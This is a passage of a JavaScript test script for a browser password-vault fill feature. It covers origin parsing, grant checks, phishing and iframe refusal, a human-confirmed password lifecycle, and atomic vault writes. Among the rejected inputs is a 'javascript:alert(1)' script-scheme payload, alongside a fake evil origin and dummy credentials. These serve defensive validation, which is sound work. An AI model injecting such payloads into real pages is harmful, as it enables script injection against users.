#!/usr/bin/env node
// WEB LOGINS — r22 PIVOT («agent locates, hub fills»):
//   vibespace-browser fill <@ref|selector> --vault [new:]<entry>/<field> [--generate] [--user <name>]
//
// FAST tier (< 3 s): pure 3-slot human-only rules + vault-engine batch/tmp pins + fake-kernel primitive leg
// (real vault-engine + real browser-logins + real browser-dialogs + real routes/browser + real routes/vault +
// shipped vibespace-browser CLI) + zero-secret/zero-digest sweep + 3 named RED mutants + PIN G safe guards.
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import http from 'node:http';
import crypto from 'node:crypto';
import { spawn } from 'node:child_process';
import { createRequire } from 'node:module';
import { scratch, freePort, deadPort } from './scratch.mjs';
import { mutantCopies, copiesCensus } from './mutant-copy.mjs';
import { startFakeKernel } from './fixtures/fake-kernel.mjs';
import { runR28LoginNails } from './fixtures/r28-login-nails.mjs';
import { runR29LoginNails } from './fixtures/r29-login-nails.mjs';
import { runR30LoginNails } from './fixtures/r30-login-nails.mjs';

const require = createRequire(import.meta.url);
const REPO = path.resolve(new URL('..', import.meta.url).pathname);
const express = require(path.join(REPO, 'node_modules/express'));
const BL = require(path.join(REPO, 'src/browser-login.js'));
const BM = require(path.join(REPO, 'src/browser-mediation.js'));
const BV = require(path.join(REPO, 'src/browser-verbs.js'));
const VE = require(path.join(REPO, 'src/server/vault-engine.js'));
const GS = require(path.join(REPO, 'src/server/grants-store.js'));
const BK = require(path.join(REPO, 'src/server/browser-keeper.js'));
const Lm = require(path.join(REPO, 'src/server/browser-logins.js'));
const Dm = require(path.join(REPO, 'src/server/browser-dialogs.js'));
const LF = (() => { try { return require(path.join(REPO, 'src/server/browser-login-fill.js')); } catch { return null; } })();
const Rm = require(path.join(REPO, 'src/routes/browser.js'));
const VRm = require(path.join(REPO, 'src/routes/vault.js'));

let pass = 0, fail = 0;
const ok = (c, label, detail) => {
  if (c) { pass++; console.log('  ✓ ' + label); }
  else { fail++; console.error('  ✗ ' + label + (detail !== undefined ? '\n      ' + (typeof detail === 'string' ? detail : JSON.stringify(detail)) : '')); }
  return !!c;
};
const eq = (a, b, label) => ok(JSON.stringify(a) === JSON.stringify(b), label, { got: a, want: b });
const quiet = { log() {}, warn() {}, error() {} };
const stubLoginChannel = ({ mediated = false, proxy = true, ephemeral = false, remote = false, external = false, remoteSession = false, hasCdp = true, label = 'ShopProfile', action = 'fill' } = {}) =>
  BM.loginFillChannelVerdict(
    BM.leaseRoadVerdict({ mediated, proxy, ephemeral: Boolean(ephemeral), remote: Boolean(remote || external || remoteSession), agent: true }),
    { proxy, external, remote, remoteSession: Boolean(remoteSession), hasCdp, usableProfiles: proxy ? [label] : [], profileLabel: label, action },
  );

function spawnNailChild(scriptRel) {
  const cleanChildEnv = Object.fromEntries(
    Object.entries(process.env).filter(([k]) => !k.startsWith('VIBESPACE_') && !k.startsWith('AGENT_BROWSER_')),
  );
  cleanChildEnv.VIBESPACE_SKIP_AGENT_HOOKS = '1';
  cleanChildEnv.VS_NO_REAL_CLI = '1';
  return new Promise((resolve) => {
    const ch = spawn(process.execPath, [path.join(REPO, scriptRel), `--repo=${REPO}`], {
      cwd: REPO,
      env: cleanChildEnv,
    });
    let out = '';
    ch.stdout.on('data', (d) => { out += d; });
    ch.stderr.on('data', (d) => { out += d; });
    const tm = setTimeout(() => { try { ch.kill('SIGKILL'); } catch {} }, 30_000);
    ch.on('close', (status) => {
      clearTimeout(tm);
      resolve({ scriptRel, status, out });
    });
  });
}

function replayNailChild(res, fallbackFn) {
  void fallbackFn;
  let seen = 0;
  for (const line of String(res.out || '').split('\n')) {
    if (line.startsWith('⑨ ') || line.startsWith('⑩ ')) {
      console.log(line);
      continue;
    }
    if (line.startsWith('[PASS] ')) {
      seen++;
      ok(true, line.slice('[PASS] '.length));
    } else if (line.startsWith('[FAIL] ')) {
      seen++;
      const rest = line.slice('[FAIL] '.length);
      const arrow = rest.indexOf(' -> ');
      if (arrow >= 0) ok(false, rest.slice(0, arrow), rest.slice(arrow + 4));
      else ok(false, rest);
    }
  }
  if (seen === 0 || (res.status !== 0 && fail === 0)) {
    ok(false, `${res.scriptRel} exited cleanly with checks`, { status: res.status, seen, tail: String(res.out || '').slice(-1500) });
  }
}

// Overlap independent Round 29 & Round 30 nail legs in isolated child processes (no shared LF target map).
const r29ChildPromise = spawnNailChild('scripts/fixtures/r29-login-nails.mjs');
const r30ChildPromise = spawnNailChild('scripts/fixtures/r30-login-nails.mjs');

const secretNeedles = (v) => {
  if (!v) return [];
  const b = Buffer.isBuffer(v) ? v : Buffer.from(String(v), 'utf8');
  const raw = b.toString('utf8');
  const d256 = crypto.createHash('sha256').update(b).digest();
  const d1 = crypto.createHash('sha1').update(b).digest();
  const d512 = crypto.createHash('sha512').update(b).digest();
  return [
    raw, JSON.stringify(raw).slice(1, -1), encodeURIComponent(raw),
    b.toString('hex'), b.toString('base64'), b.toString('base64url'),
    d256.toString('hex'), d256.toString('hex').toUpperCase(), d256.toString('base64'), d256.toString('base64url'),
    d1.toString('hex'), d1.toString('hex').toUpperCase(), d1.toString('base64'), d1.toString('base64url'),
    d512.toString('hex'), d512.toString('hex').toUpperCase(), d512.toString('base64'), d512.toString('base64url'),
  ].filter((x) => x && x.length >= 6);
};

const walkFiles = (dir) => {
  if (!fs.existsSync(dir)) return [];
  return fs.readdirSync(dir, { withFileTypes: true }).flatMap((e) => {
    const p = path.join(dir, e.name);
    return e.isDirectory() ? walkFiles(p) : e.isFile() ? [p] : [];
  });
};

// ═══ ① PURE SPEC PARSER, ORIGINS & FILL VERDICT ═══════════════════════════════════════════════════════════════════
console.log('① PURE src/browser-login.js: names, origins, --vault <entry>/<field> parser & fillVerdict');
{
  ok(BL.entryName('https://Shop.Example.test:443/login', 'Alice') === 'web-login:https://shop.example.test#alice', 'entryName normalizes origin + lowercases user');
  eq(BL.parseName('web-login:https://shop.example.test:8443#alice'), { origin: 'https://shop.example.test:8443', user: 'alice' }, 'parseName keeps non-default port');
  const dynPortA = await deadPort();
  const dynPortB = await deadPort();
  ok(BL.secureOrigin('https://shop.example.test') && BL.secureOrigin(`http://127.0.0.1:${dynPortA}`) && BL.secureOrigin(`http://localhost:${dynPortB}`) && !BL.secureOrigin('http://shop.example.test'), 'secureOrigin admits https and localhost http only');

  const hasSpecParser = ok(typeof BL.parseVaultFillSpec === 'function' && Array.isArray(BL.VAULT_FIELDS), 'r22 exports parseVaultFillSpec + VAULT_FIELDS');
  if (hasSpecParser) {
    eq(BL.VAULT_FIELDS, ['user', 'password', 'previous', 'pending', 'otp'], 'VAULT_FIELDS = [user, password, previous, pending, otp]');
    const s1 = BL.parseVaultFillSpec('shop.example.test#alice/password');
    ok(s1.ok && !s1.isNew && s1.origin === 'https://shop.example.test' && s1.user === 'alice' && s1.field === 'password', 'parseVaultFillSpec parses <site>#<user>/password', s1);
    const s2 = BL.parseVaultFillSpec('new:shop.example.test#bob/password', { generate: true });
    ok(s2.ok && s2.isNew && s2.origin === 'https://shop.example.test' && s2.user === 'bob' && s2.generate === true, 'parseVaultFillSpec parses new:<site>#<user>/password --generate', s2);
    const s3 = BL.parseVaultFillSpec('new:shop.example.test/password', { generate: true, user: 'carol' });
    ok(s3.ok && s3.isNew && s3.user === 'carol', 'parseVaultFillSpec accepts --user <name> with new:<site>/password --generate', s3);
    const badField = BL.parseVaultFillSpec('shop.example.test/secret');
    ok(!badField.ok && badField.code === 'bad_request', 'unknown field refused bad_request', badField);
    const newNoGen = BL.parseVaultFillSpec('new:shop.example.test#bob/password', { generate: false });
    ok(!newNoGen.ok && /vibespace-vault request/.test(newNoGen.error), 'new: without --generate refuses and points to vibespace-vault request', newNoGen);
    const genUser = BL.parseVaultFillSpec('shop.example.test#alice/user', { generate: true });
    ok(!genUser.ok && genUser.code === 'bad_request', '--generate on /user refused bad_request', genUser);

    // m4: bare `localhost:<port>`, `app.localhost:<port>`, and `host:<port>` shorthands resolve cleanly (never misread as URL scheme)
    const lhTab = `http://localhost:${dynPortB}`;
    const lh1 = BL.parseVaultFillSpec(`localhost:${dynPortB}#bob/password`, { tabOrigin: lhTab });
    const lh2 = BL.parseVaultFillSpec(`new:localhost:${dynPortB}#bob/password`, { generate: true, tabOrigin: lhTab });
    const lh3 = BL.parseVaultFillSpec(`localhost:${dynPortB}#bob/password`, { tabOrigin: '' });
    const lhSub = BL.parseVaultFillSpec(`app.localhost:${dynPortB}#bob/password`, { tabOrigin: `http://app.localhost:${dynPortB}` });
    const hpHttps = BL.parseVaultFillSpec('shop.example.test:8443#bob/password', { tabOrigin: 'https://shop.example.test:8443' });
    const jsBad = BL.parseVaultFillSpec('javascript:alert(1)#bob/password', { tabOrigin: lhTab });
    const mailBad = BL.parseVaultFillSpec('mailto:bob@example.com#bob/password', { tabOrigin: lhTab });
    const ftpBad = BL.parseVaultFillSpec('ftp://files.example.test#bob/password', { tabOrigin: lhTab });
    const ftpOrigin = BL.originOf('ftp://files.example.test/pub');
    ok(lh1.ok && lh1.origin === lhTab
      && lh2.ok && lh2.isNew && lh2.origin === lhTab
      && lh3.ok && lh3.origin === `https://localhost:${dynPortB}`
      && lhSub.ok && lhSub.origin === `http://app.localhost:${dynPortB}`
      && hpHttps.ok && hpHttps.origin === 'https://shop.example.test:8443'
      && !jsBad.ok && jsBad.code === 'login_bad_origin'
      && !mailBad.ok && mailBad.code === 'login_bad_origin'
      && !ftpBad.ok && ftpBad.code === 'login_bad_origin' && ftpOrigin === null,
      'm4: bare localhost:<port>, app.localhost:<port>, and host:<port> shorthands parse cleanly while ftp://, javascript:, and mailto: reject login_bad_origin',
      { lh1, lh2, lh3, lhSub, hpHttps, jsBad, mailBad, ftpBad, ftpOrigin });

    const entries = [
      { name: 'web-login:https://shop.example.test#alice', origin: 'https://shop.example.test', user: 'alice', owner: null },
      { name: 'web-login:https://shop.example.test#bob', origin: 'https://shop.example.test', user: 'bob', owner: null },
      { name: 'web-login:https://shop.example.test#own1', origin: 'https://shop.example.test', user: 'own1', owner: 'conv-own' },
    ];
    const allowAlice = (r) => (r === 'https://shop.example.test#alice' ? [{ door: 'browser-login', resource: r, to: [{ kind: 'conversation', key: 'conv-1' }], except: [] }] : []);
    const allowAliceAndBob = (r) => ((r === 'https://shop.example.test#alice' || r === 'https://shop.example.test#bob')
      ? [{ door: 'browser-login', resource: r, to: [{ kind: 'conversation', key: 'conv-1' }], except: [] }]
      : []);
    const allowSite = (r) => (r === 'https://shop.example.test#*' ? [{ door: 'browser-login', resource: r, to: [{ kind: 'conversation', key: 'conv-1' }], except: [] }] : []);
    const siteSpec = BL.parseVaultFillSpec('shop.example.test/password');
    ok(BL.fillVerdict({ tabOrigin: 'https://shop.example.test', inFrame: true, spec: s1, entries, grantRows: allowAlice, facts: { conversationKeys: ['conv-1'] }, vaultState: 'unlocked' }).code === 'login_in_frame', 'fillVerdict: inFrame => login_in_frame');
    ok(BL.fillVerdict({ tabOrigin: 'https://evil.example.test', spec: s1, entries, grantRows: allowAlice, facts: { conversationKeys: ['conv-1'] }, vaultState: 'unlocked' }).code === 'login_phishing', 'fillVerdict: mismatched tabOrigin => login_phishing');
    ok(BL.fillVerdict({ tabOrigin: 'https://evil.example.test', inFrame: true, spec: s1, entries: [], grantRows: () => [], facts: {}, vaultState: 'locked' }).code === 'vault_locked',
      'M1 gate order: fillVerdict checks vault_locked BEFORE entry, grant, tabOrigin, and inFrame');
    ok(BL.fillVerdict({ tabOrigin: 'https://evil.example.test', inFrame: true, spec: BL.parseVaultFillSpec('shop.example.test#nobody/password'), entries, grantRows: allowSite, facts: { conversationKeys: ['conv-1'] }, vaultState: 'unlocked' }).code === 'login_no_entry',
      'M1 gate order: fillVerdict checks entry & grant BEFORE tabOrigin and inFrame');
    const singleAdmitted = BL.fillVerdict({ tabOrigin: 'https://shop.example.test', spec: siteSpec, entries, grantRows: allowAlice, facts: { conversationKeys: ['conv-1'] }, vaultState: 'unlocked' });
    const ambPartial = BL.fillVerdict({ tabOrigin: 'https://shop.example.test', spec: siteSpec, entries, grantRows: allowAliceAndBob, facts: { conversationKeys: ['conv-1'] }, vaultState: 'unlocked' });
    const ambUngranted = BL.fillVerdict({ tabOrigin: 'https://shop.example.test', spec: siteSpec, entries, grantRows: () => [], facts: { conversationKeys: ['conv-stranger'] }, vaultState: 'unlocked' });
    const probeRealUser = BL.fillVerdict({ tabOrigin: 'https://shop.example.test', spec: BL.parseVaultFillSpec('shop.example.test#bob/password'), entries, grantRows: allowAlice, facts: { conversationKeys: ['conv-1'] }, vaultState: 'unlocked' });
    const probeGhostUser = BL.fillVerdict({ tabOrigin: 'https://shop.example.test', spec: BL.parseVaultFillSpec('shop.example.test#nobody/password'), entries, grantRows: allowAlice, facts: { conversationKeys: ['conv-1'] }, vaultState: 'unlocked' });
    ok(singleAdmitted.ok && singleAdmitted.user === 'alice'
      && ambPartial.code === 'login_ambiguous' && ambPartial.error.includes('2 logins match') && ambPartial.error.includes('alice, bob') && !ambPartial.error.includes('own1'),
      'fillVerdict (m7 + r25 grant-first): single granted account resolves cleanly without leaking ungranted accounts; multiple granted accounts list ONLY admitted accounts & count (never own1)',
      { singleAdmitted, ambPartial });
    ok(ambUngranted.code === 'login_not_granted' && ambUngranted.name === undefined
      && !ambUngranted.error.includes('alice') && !ambUngranted.error.includes('bob') && !ambUngranted.error.includes('own1') && !/\b[23]\b/.test(ambUngranted.error)
      && /Use for…/.test(ambUngranted.error)
      && probeRealUser.code === 'login_not_granted' && probeGhostUser.code === 'login_not_granted'
      && probeRealUser.error === probeGhostUser.error && probeRealUser.name === undefined && probeGhostUser.name === undefined,
      'fillVerdict (r25 grant-first): ungranted caller gets login_not_granted naming ONLY origin (0 usernames, 0 counts, no name, no #user enumeration oracle)',
      { ambUngranted, probeRealUser, probeGhostUser });
    const noEntry = BL.fillVerdict({ tabOrigin: 'https://shop.example.test', spec: BL.parseVaultFillSpec('shop.example.test#nobody/password'), entries, grantRows: allowSite, facts: { conversationKeys: ['conv-1'] }, vaultState: 'unlocked' });
    ok(noEntry.code === 'login_no_entry' && /vibespace-vault request/.test(noEntry.error), 'fillVerdict: missing entry => login_no_entry naming vibespace-vault request', noEntry);
    ok(BL.fillVerdict({ tabOrigin: 'https://shop.example.test', spec: s1, entries, grantRows: () => [], facts: { conversationKeys: ['conv-1'] }, vaultState: 'unlocked' }).code === 'login_not_granted', 'fillVerdict: ungranted => login_not_granted');
    ok(BL.fillVerdict({ tabOrigin: 'https://shop.example.test', spec: BL.parseVaultFillSpec('shop.example.test#own1/password'), entries, grantRows: () => [], facts: { conversationKeys: ['conv-other'] }, owners: ['conv-own'], vaultState: 'unlocked' }).ok, 'fillVerdict: caller-owned entry needs no grant');
    ok(BL.fillVerdict({ tabOrigin: 'https://shop.example.test', spec: s1, entries, grantRows: allowAlice, facts: { conversationKeys: ['conv-1'] }, vaultState: 'locked' }).code === 'vault_locked', 'fillVerdict: locked vault => vault_locked');
  }
}

// ═══ ② PURE 3-SLOT HUMAN-ONLY LIFECYCLE (RULING 1) & DEFAULT-ONLY GENERATOR (RULING 5) ═══════════════════════════
console.log('② PURE 3-slot human-only lifecycle («只有人能转正», zero clock promotion/deletion, 7d single reminder) + 24-char generator');
{
  const has3Slot = ok(
    typeof BL.newRecord === 'function'
      && typeof BL.mintChangeRecord === 'function'
      && typeof BL.confirmPendingRecord === 'function'
      && typeof BL.discardPendingRecord === 'function'
      && typeof BL.shouldRemindPending === 'function'
      && typeof BL.pendingRemindKey === 'function'
      && Array.isArray(BL.PENDING_KINDS),
    'r22 exports 3-slot human-only record functions + 7-day reminder helpers',
  );
  if (has3Slot) {
    const T0 = 1_700_000_000_000;
    const DAY = 86_400_000;
    let i = 0;
    const g = BL.generatePassword(() => Buffer.from([(i = (i + 37) & 0xff)]));
    ok(g.ok && g.password.length === 24 && BL.GENERATED_LEN === 24 && BL.CLASSES.every((cls) => [...g.password].some((ch) => cls.includes(ch))),
      'generatePassword: default-only 24-char password with all 4 character classes', g);

    const reg = BL.newRecord({
      origin: 'https://shop.example.test', username: 'bob', password: g.password,
      source: 'vault-minted', pending: 'register',
      conversation: 'Chat', now: T0, rev: 1, entryGen: 'lg-abcdef012345',
    });
    ok(reg && reg.current === null && reg.previous === null && reg.pending && reg.pending.kind === 'register' && reg.pending.password === g.password,
      'newRecord(pending:"register"): current=null, previous=null, pending={kind:"register"}');

    // Clock invariance: even 365 days later, re-reading NEVER promotes pending -> current!
    const reg365 = BL.recordOf(BL.textOf(reg));
    ok(reg365?.current === null && reg365?.pending?.kind === 'register' && !BL.shouldRemindPending(reg, T0 + 6 * DAY) && BL.shouldRemindPending(reg, T0 + 7 * DAY),
      'RULING 1: pending never auto-promotes with time; shouldRemindPending is false at +6d and true at +7d');
    const remKey = BL.pendingRemindKey('web-login:https://shop.example.test#bob', reg);
    ok(typeof remKey === 'string' && remKey.includes('web-login:https://shop.example.test#bob\u00001\u0000register\u0000')
      && !BL.shouldRemindPending(reg, T0 + 8 * DAY, { alreadyReminded: true })
      && !BL.shouldRemindPending(reg, T0 + 365 * DAY, { alreadyReminded: true })
      && JSON.stringify(BL.recordOf(reg)) === JSON.stringify(reg),
      'RULING 1 + r27: pendingRemindKey tracks external one-shot reminder without mutating the login record (+8d, +365d stay false)');

    // Discard on unconfirmed register drops the entry
    const discReg = BL.discardPendingRecord(reg);
    ok(discReg?.ok && discReg.dropEntry === true && discReg.record === null, 'RULING 1: discardPendingRecord on unconfirmed register => dropEntry:true');

    // Human Confirm promotes pending -> current (rev++)
    const conf1Res = BL.confirmPendingRecord(reg, { now: T0 + 1000 });
    const conf1 = conf1Res?.record || null;
    ok(Boolean(conf1Res?.ok && conf1?.rev === 2 && conf1?.current?.password === g.password && conf1?.pending === null && conf1?.previous === null),
      'RULING 1: confirmPendingRecord promotes register pending -> current, rev=2');

    // Candidate change -> Discard keeps current intact; second change -> Confirm rotates old current -> previous
    const cand1 = 'CandOne!2345678901234567';
    const chg1Res = conf1 ? BL.mintChangeRecord(conf1, cand1, { now: T0 + 2000 }) : null;
    const chg1 = chg1Res?.record || null;
    ok(Boolean(chg1Res?.ok && chg1?.rev === 3 && chg1?.current?.password === g.password && chg1?.pending?.kind === 'change' && chg1?.pending?.password === cand1),
      'mintChangeRecord keeps current and stages pending:"change"');
    const dupChg = chg1 ? BL.mintChangeRecord(chg1, 'Another!2345678901234567', { now: T0 + 2500 }) : null;
    ok(Boolean(dupChg && !dupChg.ok && dupChg.code === 'login_pending_exists'), 'mintChangeRecord refuses second pending candidate [login_pending_exists]');
    const discChg = chg1 ? BL.discardPendingRecord(chg1) : null;
    ok(Boolean(discChg?.ok && discChg.dropEntry === false && discChg.record?.rev === 4 && discChg.record?.current?.password === g.password && discChg.record?.pending === null),
      'RULING 1: discardPendingRecord on change clears pending and keeps current intact');

    const cand2 = 'CandTwo!2345678901234567';
    const chg2 = discChg?.record ? BL.mintChangeRecord(discChg.record, cand2, { now: T0 + 3000 })?.record : null;
    const conf2 = chg2 ? BL.confirmPendingRecord(chg2, { now: T0 + 4000 })?.record : null;
    ok(Boolean(conf2?.rev === 6 && conf2?.current?.password === cand2 && conf2?.previous?.password === g.password && conf2?.pending === null),
      'RULING 1: confirmPendingRecord on change promotes pending -> current and rotates old current -> previous');

    // Third rotation replaces previous (earlier previous dropped); previous is never deleted by clock even at +365d
    const cand3 = 'CandThr!2345678901234567';
    const chg3 = conf2 ? BL.mintChangeRecord(conf2, cand3, { now: T0 + 5000 })?.record : null;
    const conf3 = chg3 ? BL.confirmPendingRecord(chg3, { now: T0 + 365 * DAY })?.record : null;
    const conf3Reread = conf3 ? BL.recordOf(BL.textOf(conf3)) : null;
    ok(Boolean(conf3?.current?.password === cand3 && conf3?.previous?.password === cand2 && conf3Reread?.previous?.password === cand2),
      'RULING 1: previous is never deleted by clock and is replaced only on the next Confirm rotation');

    const pub = conf3 ? BL.publicOf(conf3, { name: 'web-login:https://shop.example.test#bob' }) : null;
    const pubJson = JSON.stringify(pub);
    ok(Boolean(pub && pub.rev === conf3.rev && pub.hasCurrent === true && pub.hasPrevious === true && pub.pending === null && ![g.password, cand1, cand2, cand3].some((s) => pubJson.includes(s))),
      'publicOf exposes rev + slot booleans only and zero passwords');

    // Legacy .378 5-shape upgrade compatibility (no rev, no entryGen, legacy `password` / `previous` / `pending` strings)
    const leg1 = BL.recordOf(JSON.stringify({ v: 1, origin: 'https://shop.example.test', username: 'l1', password: 'LegacyPw1!abcdefgh', source: 'owner', createdAt: T0, updatedAt: T0 }));
    const leg2 = BL.recordOf(JSON.stringify({ v: 1, origin: 'https://shop.example.test', username: 'l2', password: 'LegacyCur2!abcdefg', previous: { password: 'LegacyOld2!abcdefg', replacedAt: T0 - 1000 }, source: 'owner', createdAt: T0 - 2000, updatedAt: T0 }));
    const leg3 = BL.recordOf(JSON.stringify({ v: 1, origin: 'https://shop.example.test', username: 'l3', password: 'LegacyCand3!abcdef', previous: { password: 'LegacyCur3!abcdefg', replacedAt: T0 }, pending: 'change', source: 'vault-minted', createdAt: T0 - 5000, updatedAt: T0 }));
    const leg4 = BL.recordOf(JSON.stringify({ v: 1, origin: 'https://shop.example.test', username: 'l4', password: 'LegacyReg4!abcdefg', pending: 'register', source: 'vault-minted', createdAt: T0, updatedAt: T0 }));
    const leg5 = BL.recordOf(JSON.stringify({ v: 1, origin: 'https://shop.example.test', username: 'l5', password: 'LegacyAgent5!abcde', totpName: 'totp-l5', source: 'agent-typed', createdAt: T0, updatedAt: T0 }));
    ok(Boolean(
      [leg1, leg2, leg3, leg4, leg5].every((l) => l?.schema === 2 && JSON.stringify(BL.recordOf(l)) === JSON.stringify(l))
      && leg1?.current?.password === 'LegacyPw1!abcdefgh' && leg1.pending === null && leg1.rev === 1
      && leg2?.current?.password === 'LegacyCur2!abcdefg' && leg2?.previous?.password === 'LegacyOld2!abcdefg'
      && leg3?.current?.password === 'LegacyCand3!abcdef' && leg3?.previous?.password === 'LegacyCur3!abcdefg' && leg3?.pending === null
      && leg4?.current === null && leg4?.pending?.kind === 'register' && leg4?.pending?.password === 'LegacyReg4!abcdefg'
      && leg5?.current?.password === 'LegacyAgent5!abcde' && leg5.totpName === 'totp-l5'
    ), 'legacy .356-.390 5 record shapes upgrade losslessly to canonical schema:2, recordOf(recordOf(x))===recordOf(x), and .390 pending:change fills candidate');
  }
}

// ═══ ③ VAULT-ENGINE BATCH WRITE (afterCommit + PIN F on tmpfs & ext4) & STALE TMP SWEEP ════════════════════════════
console.log('③ vault-engine: batchRecordWrite (afterCommit + PIN F renameCount/tmpOpenCount on tmpfs & ext4) & sweepStaleVaultTmp');
{
  const runPinFLeg = async (rootDir, fsLabel) => {
    fs.rmSync(rootDir, { recursive: true, force: true });
    fs.mkdirSync(rootDir, { recursive: true });
    try {
      const staleTmp = path.join(rootDir, 'vault.json.tmp-999999999-deadbeef');
      fs.writeFileSync(staleTmp, '{"partial":true}', { mode: 0o600 });
      const eng = VE.create({ dataDir: rootDir, kdf: { N: 1024, r: 8, p: 1 }, log: quiet, idleTimer: false });
      if (fsLabel === 'tmpfs') ok(!fs.existsSync(staleTmp), 'sweepStaleVaultTmp removes orphan vault.json.tmp-<deadPid>-* on boot');
      await eng.setup('VaultPass!r22#Batch');

      const hasBatch = fsLabel === 'tmpfs'
        ? ok(typeof eng.batchRecordWrite === 'function' && typeof eng.loginRevFloor === 'function', 'vault-engine exports batchRecordWrite + loginRevFloor')
        : (typeof eng.batchRecordWrite === 'function' && typeof eng.loginRevFloor === 'function');
      if (hasBatch) {
        let renameCount = 0, tmpOpenCount = 0;
        const origRename = fs.renameSync, origOpen = fs.openSync;
        fs.renameSync = function (...args) {
          if (String(args[1] || '').endsWith('vault.json')) renameCount++;
          return origRename.apply(this, args);
        };
        fs.openSync = function (...args) {
          if (String(args[0] || '').includes('vault.json.tmp-') && args[1] === 'wx') tmpOpenCount++;
          return origOpen.apply(this, args);
        };
        let committed = 0;
        try {
          eng.batchRecordWrite((afterCommit) => {
            eng.secretPut('web-login:https://a.example.test#u1', '{"v":1,"rev":3}', { kind: 'owner', rev: 3 });
            eng.secretPut('web-login:https://b.example.test#u2', '{"v":1,"rev":5}', { kind: 'owner', rev: 5 });
            eng.secretDrop('web-login:https://b.example.test#u2');
            afterCommit(() => { committed++; });
            if (fsLabel === 'tmpfs') ok(committed === 0, 'afterCommit does not fire before vault.json atomic rename');
          });
        } finally {
          fs.renameSync = origRename;
          fs.openSync = origOpen;
        }
        const namesRow = (eng.secretNames() || []).find((s) => s.name === 'web-login:https://a.example.test#u1');
        ok(renameCount === 1 && tmpOpenCount === 1 && committed === 1 && eng.loginRevFloor() === 5 && namesRow?.rev === 3,
          `PIN F (${fsLabel}) + L2: batchRecordWrite coalesces N writes into renameCount===1 & tmpOpenCount===1 (syscall counters only), advances loginRevFloor, exposes secretNames().rev===3, and runs afterCommit once`,
          { fsLabel, renameCount, tmpOpenCount, committed, floor: eng.loginRevFloor(), namesRev: namesRow?.rev });

        if (fsLabel === 'tmpfs') {
          let abortedCommit = 0, threw = false;
          try {
            eng.batchRecordWrite((afterCommit) => {
              eng.secretPut('web-login:https://c.example.test#u3', '{"v":1}', { kind: 'owner', rev: 2 });
              afterCommit(() => { abortedCommit++; });
              throw new Error('simulated failure');
            });
          } catch { threw = true; }
          ok(threw && abortedCommit === 0 && !eng.hasEntry('web-login:https://c.example.test#u3'),
            'batchRecordWrite rolls back in-memory record and suppresses afterCommit on throw');
        }
      }
      eng.close();
    } finally {
      fs.rmSync(rootDir, { recursive: true, force: true });
    }
  };
  await runPinFLeg(scratch('vl-r23-ve-tmpfs'), 'tmpfs');
  const ext4Base = fs.existsSync('/var/tmp') ? `/var/tmp/vs-pinf-ext4-${process.pid}-${crypto.randomBytes(4).toString('hex')}` : scratch('vl-r23-ve-ext4');
  await runPinFLeg(ext4Base, 'ext4');
}

// ═══ ④ FAKE-KERNEL PRIMITIVE LEG (CLI + ROUTES + WATCH + VAULT + READ FENCE + WIPE + SWEEP) ═══════════════════════
console.log('④ Fake-kernel primitive leg: fill @ref/selector --vault, human-only Confirm/Discard, 409 fence, SPA wipe, exfil block, zero-digest sweep');
{
  const ROOT4 = scratch('vl-r22-fk');
  fs.rmSync(ROOT4, { recursive: true, force: true });
  const DATA = path.join(ROOT4, 'data'), HOME = path.join(ROOT4, 'home'), BIN = path.join(ROOT4, 'bin'), XDG = path.join(ROOT4, 'xdg');
  for (const d of [DATA, path.join(HOME, '.agent-browser'), BIN, XDG]) fs.mkdirSync(d, { recursive: true, mode: 0o700 });

  // Fake agent-browser binary to prove zero spawns on `fill --vault`
  const AB_LOG = path.join(ROOT4, 'ab-spawns.log');
  fs.writeFileSync(path.join(BIN, 'agent-browser'), `#!${process.execPath}
const fs = require('fs');
fs.appendFileSync(${JSON.stringify(AB_LOG)}, JSON.stringify(process.argv.slice(2)) + '\\n');
if (process.argv[2] === '--version') { console.log('${BV.TABLE_VERSION}'); process.exit(0); }
console.log(JSON.stringify({ success: true, data: { ok: true } }));
`, { mode: 0o755 });
  const abSpawns = () => (fs.existsSync(AB_LOG) ? fs.readFileSync(AB_LOG, 'utf8').trim().split('\n').filter(Boolean).length : 0);

  let clock = 1_750_000_000_000;
  const DAY = 86_400_000;
  const eng = VE.create({ dataDir: DATA, kdf: { N: 1024, r: 8, p: 1 }, log: quiet, idleTimer: false, now: () => clock });
  const VPW = 'VaultR22#' + crypto.randomBytes(6).toString('hex');
  await eng.setup(VPW);
  const grants = GS.create({ memory: true });

  const fyItems = new Map();
  let fySeq = 0;
  const forYou = {
    add(profileId, item) {
      const id = `ut-r22fk${String(++fySeq).padStart(3, '0')}`;
      fyItems.set(id, { id, profileId, status: 'open', ...item });
      return id;
    },
    resolve(id) { const it = fyItems.get(id); if (it) it.status = 'done'; },
    list({ status } = {}) { return [...fyItems.values()].filter((x) => !status || x.status === status); },
  };

  let totpCalls = 0;
  let isTakeover = false;
  const hubLogs = [];
  const logSink = { log: (l) => hubLogs.push(String(l)), warn: (l) => hubLogs.push(String(l)), error: (l) => hubLogs.push(String(l)) };
  const OTP_VAL = '482910';
  const logins = Lm.create({
    vault: eng,
    grants: () => grants,
    totpCode: (name) => { totpCalls++; return name === 'shop-2fa' ? { ok: true, code: OTP_VAL } : { ok: false, code: 'no_totp' }; },
    forYou,
    now: () => clock,
    log: (l) => hubLogs.push(String(l)),
  });

  const PW_ALICE = 'AliceCur!' + crypto.randomBytes(6).toString('hex');
  const ENTRY_ALICE = BL.entryName('https://shop.example.test', 'alice');
  const missingTotpAdd = logins.addOwn({ origin: 'https://shop.example.test', username: 'alice', password: PW_ALICE, totpName: 'no-such-totp' }, { who: 'owner' });
  ok(!missingTotpAdd.ok && missingTotpAdd.code === 'bad_totp' && !eng.hasEntry(ENTRY_ALICE),
    'm6: addOwn refuses totpName pointing to a non-existent Vault TOTP entry (bad_totp)', missingTotpAdd);
  eng.secretPut('totp:shop-2fa', 'JBSWY3DPEHPK3PXP');
  logins.addOwn({ origin: 'https://shop.example.test', username: 'alice', password: PW_ALICE, totpName: 'shop-2fa' }, { who: 'owner' });
  grants.set('browser-login', 'https://shop.example.test#*', { to: [{ kind: 'conversation', key: 'conv-fk-1' }], except: [] });

  const keeper = BK.create({
    rootDir: DATA, dataDir: DATA, profilesRoot: path.join(DATA, 'profiles'), runtimeRoot: path.join(DATA, 'run'),
    log: quiet, launchImpl: async () => { throw new Error('no launch'); },
  });
  const prof = keeper.createProfile({ label: 'ShopProfile' }, { owner: { kind: 'instance', id: null } });
  const PID = prof.id, KEY = 'bk-0000f22a', SID = 'sess-fk-1', CID = 'conv-fk-1', TOKEN = `vsst_${crypto.randomBytes(12).toString('hex')}`;

